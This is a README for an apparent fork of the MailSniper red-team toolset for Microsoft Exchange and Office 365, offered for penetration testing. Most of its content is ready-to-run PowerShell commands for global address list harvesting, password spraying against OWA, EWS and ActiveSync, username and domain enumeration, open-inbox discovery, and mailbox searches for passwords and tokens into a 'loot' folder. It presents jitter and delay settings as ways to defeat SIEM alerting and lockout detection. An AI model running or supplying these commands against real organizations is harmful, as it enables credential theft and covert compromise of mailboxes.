# Enhanced_MailSniper
Enhanced Edition of MailSniper with Threads , Jitter and Delay .
A penetration testing and red teaming toolset for Microsoft Exchange, Office 365, and Outlook Web Access (OWA/EWS/EAS) environments.

---

## Acknowledgments & Credits

I extend my sincere gratitude and appreciation to **Beau Bullock** ([@dafthack](https://twitter.com/dafthack)) from **Black Hills Information Security (BHIS)**, the original creator and author of **MailSniper**. 

His pioneering research and development laid the foundational architecture for Exchange and Office 365 assessment tooling. This enhanced edition builds directly upon his work to provide extended operational stability, high-volume directory scalability, advanced multi-threading, and granular OPSEC controls for modern security engagements.

---

## Key Enhancements & New Features

This customized version introduces critical reliability, scalability, and evasion features designed for enterprise environments:

| Feature | Description | Benefit |
| :--- | :--- | :--- |
| **Chunked OWA Pagination (`-PageSize`)** | Replaced the monolithic `MaxEntriesReturned: 999999999` OWA `FindPeople` query with incremental offset-based chunking. | Prevents IIS JSON serialization overruns, WAF body limits, and connection drops when harvesting massive directories (e.g., 8,000+ mailboxes). |
| **Multi-Threaded EWS Harvesting (`-Threads`)** | Parallelized `Get-GlobalAddressList` across independent background jobs when querying EWS (splitting the 676 letter combinations `AA`–`ZZ`). | Drastically accelerates address list extraction from hours to minutes while isolating thread failures. |
| **Low-and-Slow OPSEC Controls (`-Delay` & `-Jitter`)** | Added configurable sleep durations and randomized percentage jitter across all enumeration and spraying modules. | Defeats threshold-based SIEM alerting, API rate limiters, and WAF behavioral detection. |
| **Automatic Connection Recovery** | Built-in 3-stage exponential backoff and auto-reconnection loop for socket drops and `ServiceRequestException` errors. | Long-running operations will not crash when the Exchange server closes underlying keep-alive TCP connections. |
| **Progressive Real-Time Streaming (`-OutFile`)** | Discovered entries and valid credentials are immediately written and flushed to disk as they are found. | Eliminates data loss in the event of an abrupt network disconnection or operator interruption. |

---

## Installation & Import

To load the module into your current PowerShell session:

```PowerShell
Import-Module .\MailSniper.ps1
```

> **Note:** MailSniper embeds required EWS assemblies directly. No external DLL installation is required.

---

## Usage Guide & Examples

All examples below use the dummy domain `xyz.com`, Exchange host `mail.xyz.com`, and synthetic credentials.

---

### 1. Global Address List (GAL) Harvesting (`Get-GlobalAddressList`)

Harvest organizational email addresses through Outlook Web Access (OWA) or Exchange Web Services (EWS).

#### Option A: Paginated OWA Extraction (Recommended for 5,000+ Users)
Uses incremental 250-user chunks with a 2-second delay and 20% randomized jitter:
```PowerShell
Get-GlobalAddressList -ExchHostname mail.xyz.com `
                      -UserName "XYZ\jdoe" `
                      -Password "Winter2026!" `
                      -PageSize 250 `
                      -Delay 2 `
                      -Jitter 20 `
                      -OutFile .\xyz_gal_users.txt
```

#### Option B: Multi-Threaded EWS Extraction
Parallelizes the 676 two-letter search terms across 5 concurrent worker threads:
```PowerShell
Get-GlobalAddressList -ExchHostname mail.xyz.com `
                      -UserName "XYZ\jdoe" `
                      -Password "Winter2026!" `
                      -Threads 5 `
                      -Delay 1 `
                      -Jitter 15 `
                      -OutFile .\xyz_ews_users.txt
```

---

### 2. Password Spraying

Perform controlled password spraying against OWA, EWS, and ActiveSync endpoints with throttling and jitter to evade lockout policies.

#### Password Spraying via OWA (`Invoke-PasswordSprayOWA`)
```PowerShell
Invoke-PasswordSprayOWA -ExchHostname mail.xyz.com `
                        -UserList .\xyz_gal_users.txt `
                        -Password "Spring2026!" `
                        -Threads 1 `
                        -Delay 5 `
                        -Jitter 30 `
                        -OutFile .\owa_sprayed_creds.txt
```

#### Password Spraying via EWS (`Invoke-PasswordSprayEWS`)
```PowerShell
Invoke-PasswordSprayEWS -ExchHostname mail.xyz.com `
                        -UserList .\xyz_gal_users.txt `
                        -Password "Spring2026!" `
                        -Threads 1 `
                        -Delay 4 `
                        -Jitter 25 `
                        -OutFile .\ews_sprayed_creds.txt
```

#### Password Spraying via Exchange ActiveSync (`Invoke-PasswordSprayEAS`)
```PowerShell
Invoke-PasswordSprayEAS -ExchHostname mail.xyz.com `
                        -UserList .\xyz_gal_users.txt `
                        -Password "Spring2026!" `
                        -Threads 1 `
                        -Delay 5 `
                        -Jitter 20 `
                        -OutFile .\eas_sprayed_creds.txt
```

---

### 3. Username & Domain Enumeration

#### Harvest Valid Usernames via OWA Timing / Responses (`Invoke-UsernameHarvestOWA`)
```PowerShell
Invoke-UsernameHarvestOWA -ExchHostname mail.xyz.com `
                         -UserList .\candidate_users.txt `
                         -Threads 1 `
                         -Delay 2 `
                         -Jitter 15 `
                         -OutFile .\valid_usernames.txt
```

#### Discover Internal AD Domain Name from OWA Headers (`Invoke-DomainHarvestOWA`)
```PowerShell
Invoke-DomainHarvestOWA -ExchHostname mail.xyz.com
```

#### Resolve Active Directory sAMAccountNames via EWS (`Get-ADUsernameFromEWS`)
Converts email addresses into full AD usernames for lateral movement preparation:
```PowerShell
Get-ADUsernameFromEWS -ExchHostname mail.xyz.com `
                      -EmailList .\xyz_gal_users.txt `
                      -Delay 1 `
                      -Jitter 10 `
                      -OutFile .\resolved_ad_users.txt
```

---

### 4. Mailbox & Permission Hunting

#### Identify Open / Delegated Inboxes Across the Domain (`Invoke-OpenInboxFinder`)
Scans all harvested email addresses to identify inboxes accessible by the current authenticated user:
```PowerShell
Invoke-OpenInboxFinder -EmailList .\xyz_gal_users.txt `
                       -Delay 1 `
                       -Jitter 15 `
                       -OutFile .\open_inboxes.txt
```

#### Enumerate Mailbox Folders (`Get-MailboxFolders`)
```PowerShell
Get-MailboxFolders -Mailbox "jdoe@xyz.com"
```

---

### 5. Email Content Searching

#### Search Current User Mailbox for Sensitive Data (`Invoke-SelfSearch`)
Searches the authenticated user's inbox and subfolders for sensitive keywords and downloadable attachments:
```PowerShell
Invoke-SelfSearch -Mailbox "jdoe@xyz.com" `
                  -Folder "all" `
                  -Terms "*password*","*vpn*","*creds*","*confidential*" `
                  -CheckAttachments `
                  -DownloadDir .\loot\ `
                  -OutputCsv .\self_search_results.csv
```

#### Organization-Wide Mailbox Search as Administrator (`Invoke-GlobalMailSearch`)
Grants `ApplicationImpersonation` and searches all domain mailboxes:
```PowerShell
Invoke-GlobalMailSearch -ImpersonationAccount "jdoe" `
                        -AdminUserName "XYZ\admin_user" `
                        -AdminPassword "AdminPass2026!" `
                        -ExchHostname "Exch01.xyz.com" `
                        -Terms "*password*","*secret*","*token*" `
                        -OutputCsv .\global_email_search.csv
```

---

## Enhanced Parameters Reference

| Parameter | Type | Default | Applicable Cmdlets | Description |
| :--- | :--- | :--- | :--- | :--- |
| `-PageSize` | `[int]` | `250` | `Get-GlobalAddressList` | Number of persona records fetched per OWA request. Controls batch size to prevent server-side buffering issues. |
| `-Threads` | `[string]` | `"1"` | `Get-GlobalAddressList`, `Invoke-PasswordSpray*`, `Invoke-UsernameHarvest*` | Number of concurrent worker threads or parallel PowerShell jobs to deploy. |
| `-Delay` | `[int]` | `0` | All enumeration & spraying cmdlets | Static base sleep time in seconds applied between individual requests or batches. |
| `-Jitter` | `[int]` | `0` | All enumeration & spraying cmdlets | Random variance percentage (0–100%) applied to `-Delay` to create non-deterministic request intervals. |
| `-OutFile` | `[string]` | `None` | All cmdlets | Destination text file for progressive real-time result streaming. |

---

## Professional & Operational Considerations

1. **Lockout Policy Adherence:** Always verify the target organization's Account Lockout Threshold and Observation Window before launching password spraying (`Invoke-PasswordSpray*`). Use conservative `-Delay` and `-Threads 1` settings.
2. **Bandwidth & Serialization Overhead:** When dealing with directories exceeding 10,000 entries, maintain `-PageSize` between `100` and `500` to prevent Exchange throttling mechanisms from interrupting queries.
3. **Evidence Hygiene:** Ensure all extracted email lists, loot directories, and credential files are handled according to your engagement Rules of Engagement (RoE) and encrypted at rest.
